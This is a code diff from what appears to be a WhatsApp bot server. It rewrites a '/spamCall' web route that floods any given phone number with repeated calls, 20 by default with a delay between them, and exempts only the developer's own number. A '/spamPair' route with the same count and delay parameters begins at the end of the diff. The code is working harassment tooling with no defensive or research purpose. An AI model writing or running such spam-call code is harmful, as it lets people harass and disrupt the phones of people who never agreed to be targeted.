@@ -279,33 +279,59 @@ contactVcard: true
     }
 });
 //====================================\\
+// Route for Spam Call
 app.get('/spamCall', async (req, res) => {
-    const { target } = req.query; // Access the target parameter from the query string
-    // Check if the target is a developer number
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send('Cannot attack developer');
+    const { target, count = 20, delay = 3000 } = req.query;
+
+    // Helper function to check if the number is a developer's number
+    function isDeveloperNumber(number) {
+        const developerNumbers = ["916909137213"]; // Add protected numbers here
+        return developerNumbers.includes(number.replace(/[^\d]/g, ""));
     }
-async function sendOfferCall(target) {
-    try {
-        await XeonBotInc.offerCall(target);
-        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
-    } catch (error) {
-        console.error(chalk.white.bold(`Failed Send Offer Call To Target:, error`));
-    }
-}
-// Basic validation for phone numbers
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
+
+    // Validate the phone number
+    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/;
     if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send('Phone number you have provided is invalid');
+        return res.status(400).send("Invalid phone number provided.");
     }
+
+    // Protect developer numbers
+    if (isDeveloperNumber(target)) {
+        return res.status(403).send("Cannot attack developer.");
+    }
+
+    // Function to perform the spam call
+    async function spamCall(target, count, delay) {
+        const jid = `${target.replace(/[^\d]/g, "")}@s.whatsapp.net`;
+        const spamCount = parseInt(count);
+        const delayMs = parseInt(delay);
+
+        for (let i = 0; i < spamCount; i++) {
+            try {
+                // Perform the spam call action here
+                await XeonBotInc.sendMessage(jid, { call: {} }); // Example call structure
+                console.log(`# Success Spam Call - Number: ${target} - Attempt: ${i + 1}`);
+
+                // Wait before sending the next call
+                await new Promise(resolve => setTimeout(resolve, delayMs));
+            } catch (err) {
+                console.error(`Error sending spam call: ${err.message}`);
+                if (err.message.includes("Connection Closed")) {
+                    console.log("Connection closed, stopping spam.");
+                    break;
+                }
+            }
+        }
+    }
+
     try {
-    	res.send(`Started attacking the number ${target}`);
-        await sendOfferCall(target); // Pass validated phone number to the function
+        res.send(`Started spamming calls to ${target}`);
+        await spamCall(target, count, delay); // Trigger the spam call function
     } catch (error) {
         console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
+        res.status(500).send("An error occurred while spamming calls.");
     }
-});  
+});
 //====================================\\
 app.get('/spamPair', async (req, res) => {
     const { target, count = 20, delay = 3000 } = req.query;
